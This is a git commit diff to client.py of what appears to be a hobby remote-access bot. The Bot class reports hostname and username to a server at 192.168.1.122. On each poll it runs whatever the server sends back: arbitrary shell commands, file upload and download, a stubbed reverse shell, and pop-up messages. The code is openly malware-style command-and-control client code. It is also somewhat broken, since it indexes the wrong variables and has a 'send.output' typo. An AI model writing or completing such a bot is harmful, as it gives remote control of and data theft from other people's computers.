e8bff4c4e0f93d785e55ff5b2ab2b6055a3e961c
utkarsh <utkarsh@windows>
2020-04-09 16:11:22 -0700

    check for command every 30 seconds

--- client/client.py
+++ client/client.py
@@ -10,7 +10,7 @@ import requests
 import platform
 import os
 from subprocess import check_output
-
+import ctypes
     
 class Bot(object):
     
@@ -25,8 +25,10 @@ class Bot(object):
         user = os.popen('whoami').read()
         user = user.split("\\", 1)[-1]
         return user
-
-    def reverse_shell(self):
+    def display_message(self, message):
+        ctypes.windll.user32.MessageBoxW(0, message, "Alert", 0)
+    
+    def reverse_shell(self, dest_addr, bind_port):
         print("end")
 
     def ping_server(self):
@@ -35,7 +37,6 @@ class Bot(object):
                     'hostname': self.hostname,
                     'username': self.username
                 }
-        print(send['platform'])
         r = requests.post("http://192.168.1.122" + '/api/' + self.uid + '/status', json=send)
         return r.text
 
@@ -49,24 +50,36 @@ class Bot(object):
             self.send_output(out)
 
     def run(self):
-        job = self.ping_server()
-        print(job)
-        self.run_command(job)
-
-        """
+        
         start = time.time()
         while True:
             job = self.ping_server()
-
-
-
-
+            print(job)
+            syn = len(job) > 1
+            cmdarr = job.split(" ")
+            if cmdarr[0] == "shell":
+                self.run_command(" ".join(cmdarr[1:]))
+            elif cmdarr[0] == "upload":
+                if syn:
+                    self.upload(job[1])
+                else:
+                    self.send_output("incorrect num of args: upload <path>")
+            elif cmdarr[0] == "download":
+                if len(job) == 3:
+                    self.download(job[1], job[2])
+                else:
+                    self.send_output("incorrect num of args: download <source_url> <dest>")
+            elif cmdarr[0] == "reverse_shell":
+                if len(job) == 3:
+                    self.reverse_shell(job[1], job[2])
+                else:
+                    self.send.output("incorrect num of args: reverse_shell <dest_addr> <bind_port>")
+            elif cmdarr[0] == "display_message":
+                if len(job) > 1:
+                    self.display_message(job.split("'"))
+                else:
+                    self.send_output("error")
             time.sleep(60.0 - ((time.time() - start) % 60.0))
-
-
-        print(self.ping_server())
-        """
-
        
 def main():
     bot = Bot()
